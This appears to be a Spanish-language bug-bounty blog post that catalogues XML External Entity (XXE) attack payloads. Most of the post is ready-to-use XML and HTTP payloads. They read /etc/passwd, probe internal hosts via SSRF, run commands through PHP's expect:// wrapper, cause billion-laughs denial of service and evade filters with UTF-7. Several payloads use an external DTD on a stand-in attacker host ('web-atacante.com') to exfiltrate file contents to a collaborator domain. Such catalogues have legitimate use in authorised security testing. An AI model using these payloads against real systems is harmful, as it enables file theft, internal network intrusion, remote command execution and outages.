---
layout: post
title:  "XXE Attacks"
author: erik
categories: [ Web ]
image: https://user-images.githubusercontent.com/47476901/158905099-e3bd6d01-a91d-486b-8d64-db4dd55f97cd.png
beforetoc: ""
toc: false
tags: [ Web, Bug Bounty, Payloads ]
---
Ataques XXE (XML External Entity) son vulnerabilidades en la cual una aplicacion que analiza las entradas XML y un atacante podría alterar los datos XML en la peticion para ejecutar un ataque.

# Table of Contents
1. [Peligros en los ataques XXE](#PeligrosXXE)
2. [Payloads](#XXEpayloads)<br>
   2.1. [XXE a LFI](#XXEaLFI)<br>
   2.2. [XXE a SSRF](#XXEaSSRF)<br>
   2.3. [XXE a RCE](#XXEaRCE)<br>
   2.4.  [XXE a DOS](#XXEaDOS)
6. [Blind en peticion](#BlindXXE)
7. [Bypass XXE](#XXEBypass)
8. [Out-Of-Band](#OutOFBand)

---

### 1- Peligros en los ataques XXE <a name="PeligrosXXE"></a>
- **Exfiltrar informacion critica:**<br>
Seria posible obtener archivos internos del servidor incluso en servicios de la red local, lo cual es peligroso.<br>
Ejemplo: 
[XXE a LFI](#XXEaLFI)
- **Enumerar puertos y dominios en direcciones internas a la red:**<br>
A través de las peticiones ir enumerando la red<br>
Ejemplo: 
[XXE a SSRF](#XXEaSSRF)
- **Enumerar puertos abiertos en otras direcciones extrernas**<br>
 Hacer una enumeracion de puertos mediante peticiones.
- **Ejecutar codigo:** <br>
Si el servidor dispone del modulo "expect" de PHP, seria posible ejecutar codigo y poder llegar a poder ejecutar comandos.<br>
Ejemplo: 
[XXE a RCE](#XXEaRCE)
- **Denegacion del servicio**
Causa una denegacion de servicio mediante repetidas llamadas en las funciones entitys<br>
Ejemplo: 
[XXE a DOS](#XXEaDOS)

---

### 2- XXE payloads <a name="XXEpayloads"></a>
**2.1- LFI Test** <a name="XXEaLFI"></a><br>
Ver archivos internos del servidor

```xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

**2.2- XXE a SSRF** <a name="XXEaSSRF"></a><br>
Enumerar la red local del servidor
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "https://192.168.0.1">]>
<foo>&xxe;</foo>
```

**2.3- XXE a RCE** <a name="XXEaRCE"></a><br>
Abusando del modulo expect de php para ejecutar comandos
(Se requiere tener este modulo en el servidor)
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [ <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "expect://id" >]>
    <checkproduct>
       <productId>&xxe;</productId>
       <storeId>2</storeId>
    </checkproduct>
```
**2.4- XXE a DOS** <a name="XXEaDOS"></a><br>
Causa una denegacion de servicio mediante repetidas llamadas en las funciones de las entity's
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```
---

### 3- XXE blind en peticion <a name="BlindXXE"></a>
**3.1- Ver si existe una XXE sin que se vea en la peticion**

Una forma de identificar una XML blind en una petición: Si la aplicación incrusta los datos enviados en un documento XML y luego se analiza el documento como pasa en una solicitud SOAP de backend. Podemos probar a inyectar XInclude que es una parte de la especificación XML que permite crear un documento XML a partir de subdocumentos.<br>
Ejemplo:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>



    POST /product/stock HTTP/1.1
    Host: dominio.com
    Content-Length: 126
    
    productId=1&storeId=1
    ------------------------------
    POST /product/stock HTTP/1.1
    Host: dominio.com
    Content-Length: 126
    
    productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

 **3.2- Tambien se podria usar esto en caso de que sea blind**
 ```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>

    POST /product/stock HTTP/1.1
    Host: dominio.com
    Content-Length: 126
    
    productId=1&storeId=1
    ------------------------------
    POST /product/stock HTTP/1.1
    Host: dominio.com
    Content-Length: 126
    
    productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://web-atacante.com"/></foo>&storeId=1
```

**3.3- Blind XXE test (Cuando no devuelve valores)**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo (#ANY)>
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY blind SYSTEM "https://subdominio.burpcolaborator.net/?%xxe;">]>
<foo>&blind;</foo>
```
---
### 4- XXE bypass <a name="XXEBypass"></a>
**4.1- XXE UTF-7**

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://web-atacante.com+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```

**4.2- Access Control bypass (cargando datos confidenciales)**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY cargar SYSTEM "php://filter/read=convert.base64-encode/resource=http://web-vulnerable.com/config.php">]>
<foo><result>&cargar;</result></foo>
```

---

### 5- Ataques XXE Out-Of-Band: <a name="OutOFBand"></a>

**5.1- EJEMPLO 1**
- Se inyecta en el valor &xxe; en uno de los valores xml que se envian
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://web-atacante.com"> ]>
```

**5.2- EJEMPLO 2**
- Payload que incluiremos completo en el valor xml que se envia. Hará una peticion a la web del atacante, asi podremos saber si realmente procesa la informacion que le mandamos.

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-atacante.com"> %xxe; ]>
```

**5.3- EJEMPLO 3**
- Este codigo es de http://web-atacante.com/cositas.dtd
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://subdominio.burpcollaborator.net/?x=%file;'>">
%eval;
%exfiltrate; 
```

- Inyeccion XML antes de los valores de la pagina, inyectará el codigo de cositas.dtd en la pagina

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-atacante.com/cositas.dtd"> %xxe;]>
```

**5.4- EJEMPLO 4**
- XXE BLIND basado en mensaje de error
- Este codigo es de http://web-atacante.com/cositas.dtd

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///estonoexiste/%file;'>">
%eval;
%error;
```

- Inyeccion XML en la pagina, inyectará el codigo de cositas.dtd 

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-atacante.com/cositas.dtd"> %xxe;]>
```

**5.5- EJEMPLO 5**
- Explotando una XXE abusando de los archivos DTD del sistema, en el archivo llama a ISOamso, usaremos esa variable para explotar la XXE creando un xml personalizado que realice la funcion de llamar al archivo de /etc/passwd que es el objetivo. 

```xml
<!DOCTYPE foo [
<!ENTITY % el_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
  <!ENTITY &#x25; variable "
      <!ENTITY &#x26;#x25; errormensaje SYSTEM &#x27;file:///estonoexiste/&#x25;file;&#x27;>
  ">
  &#x25;variable;
  &#x25;errormensaje;
'>%el_dtd;]>
```
